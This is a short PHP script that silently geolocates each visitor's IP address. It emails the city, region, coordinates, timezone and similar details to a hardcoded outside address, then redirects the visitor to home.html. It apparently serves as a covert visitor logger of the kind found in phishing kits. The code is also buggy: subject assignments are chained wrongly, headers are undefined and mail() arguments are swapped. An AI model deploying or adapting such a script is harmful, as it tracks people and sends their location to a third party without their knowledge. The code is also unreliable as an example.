<?php
$to = "sujal@wwpager.site";
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$body = "{$geoplugin->city}";
 
$subject =   "Geolocation results for {$geoplugin->ip}: \n".
$subject =	"City: {$geoplugin->city} \n".
$subject =	"Region: {$geoplugin->region} \n".
$subject =	"Region Code: {$geoplugin->regionCode} \n".
$subject =	"Region Name: {$geoplugin->regionName} \n".
$subject =	"DMA Code: {$geoplugin->dmaCode} \n".
$subject =	"Country Name: {$geoplugin->countryName} \n".
$subject =	"Country Code: {$geoplugin->countryCode} \n".
$subject =	"Latitude: {$geoplugin->latitude}\n".
$subject =	"Longitude: {$geoplugin->longitude} \n".
$subject =	"Radius of Accuracy (Miles): {$geoplugin->locationAccuracyRadius} \n".
$subject =	"Timezone: {$geoplugin->timezone}  \n".
$subject =	"Currency Code: {$geoplugin->currencyCode} \n".
$subject =	"Currency Symbol: {$geoplugin->currencySymbol} \n";
$send = mail($to,  $body, $subject, $headers);
header('Location: home.html');
?>